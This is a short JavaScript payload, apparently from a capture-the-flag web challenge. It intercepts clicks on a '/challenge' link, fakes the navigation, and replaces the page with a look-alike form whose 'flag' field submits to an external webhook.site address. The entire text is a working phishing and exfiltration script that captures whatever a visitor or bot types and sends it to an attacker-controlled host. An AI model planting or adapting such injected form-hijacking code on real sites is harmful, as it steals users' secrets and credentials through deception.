
(() => {
    const webhook =
        'https://webhook.site/67909b69-79e2-46cd-8eb1-bf3cbfddac04';

    const link = document.querySelector('a[href="/challenge"]');
    if (!link) return;

    link.addEventListener('click', e => {
        e.preventDefault();
        e.stopImmediatePropagation();

        // Keep our JavaScript context alive
        history.pushState({}, '', '/challenge');

        // Create the form expected by bot.py
        document.querySelector('.content').innerHTML = `
            <fieldset>
                <form method="GET" action="${webhook}">
                    <input name="flag" autocomplete="off">
                    <input type="hidden" name="id" value="1">
                    <input type="submit" value="Submit">
                </form>
            </fieldset>
        `;
    }, true);
})();
